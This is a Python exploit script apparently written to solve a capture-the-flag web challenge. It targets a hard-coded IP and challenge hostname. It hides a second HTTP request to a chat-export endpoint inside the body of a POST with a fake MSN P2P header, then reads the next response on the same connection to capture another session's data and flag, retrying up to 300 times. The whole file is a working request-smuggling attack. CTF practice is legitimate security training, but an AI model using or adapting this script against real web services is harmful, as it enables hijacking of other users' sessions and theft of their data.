#!/usr/bin/env python3
import http.client
import json
import re
import struct
import sys
import time

HOST = "65.108.241.138"
HOST_HEADER = "msnrevive.challs.srdnlen.it"
PORT = 80
SESSION_ID = "00000000-0000-0000-0000-000000000000"
FLAG_RE = re.compile(r"srdnlen\{[^}\n]+\}")


def build_poison_body() -> bytes:
    export_json = json.dumps({"session_id": SESSION_ID, "format": "html"}, separators=(",", ":"))
    smuggled = (
        "POST /api/export/chat HTTP/1.1\r\n"
        f"Host: {HOST_HEADER}\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(export_json)}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{export_json}"
    ).encode()

    p2p_header = struct.pack("<IIQQIIIIQ", 1, 1, 0, 0, 0, 0, 0, 0, 0)
    return p2p_header + smuggled


def attempt():
    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
    try:
        body = build_poison_body()

        conn.request(
            "POST",
            "/api/chat/event",
            body=body,
            headers={
                "Host": HOST_HEADER,
                "Content-Type": "application/x-msnmsgrp2p",
                "Connection": "keep-alive",
            },
        )
        r1 = conn.getresponse()
        _ = r1.read()

        conn.request(
            "GET",
            "/api/me",
            headers={"Host": HOST_HEADER, "Connection": "close"},
        )
        r2 = conn.getresponse()
        data2 = r2.read().decode("utf-8", errors="replace")

        m = FLAG_RE.search(data2)
        return (m.group(0) if m else None), data2, r1.status, r2.status
    finally:
        conn.close()


def main():
    max_tries = int(sys.argv[1]) if len(sys.argv) > 1 else 300

    for i in range(1, max_tries + 1):
        try:
            flag, resp2, s1, s2 = attempt()
            if flag:
                print(f"[+] Flag found on try #{i}: {flag}")
                return
            snippet = resp2[:100].replace("\n", " ")
            print(f"[-] try #{i}: no flag (r1={s1}, r2={s2}) snippet={snippet!r}")
        except Exception as e:
            print(f"[!] try #{i}: {e}")
        time.sleep(0.01)

    print("[x] Flag not found")


if __name__ == "__main__":
    main()
